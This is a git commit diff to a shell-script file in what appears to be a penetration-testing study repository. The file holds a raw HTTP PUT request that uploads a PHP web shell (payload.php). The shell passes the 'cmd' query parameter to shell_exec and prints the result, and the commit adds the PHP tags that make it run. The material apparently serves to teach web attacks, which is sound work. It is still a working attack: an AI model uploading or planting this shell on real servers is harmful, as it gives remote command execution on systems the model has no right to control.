f8e321c47f92cf97d0571c529b3413e3b0db1915
dogui <56701447+doguile@users.noreply.github.com>
2021-06-18 13:51:02 +0200

    Update Uploading_PHP_shell_with_PUT.sh

--- Penetration_Testing_Basics/04_Web_Attacks/Uploading_PHP_shell_with_PUT.sh
+++ Penetration_Testing_Basics/04_Web_Attacks/Uploading_PHP_shell_with_PUT.sh
@@ -3,10 +3,13 @@ PUT /payload.php HTTP/1.0
 Content-type: text/html
 Content-length: 136
 
-if (isset($_GET['cmd'])) {
+<?
+if (isset($_GET['cmd'])) 
+{
   $cmd = $_GET['cmd'];
   echo '<pre>';
   $result = shell_exec($cmd);
   echo $result;
   echo '</pre>';
 }
+?>
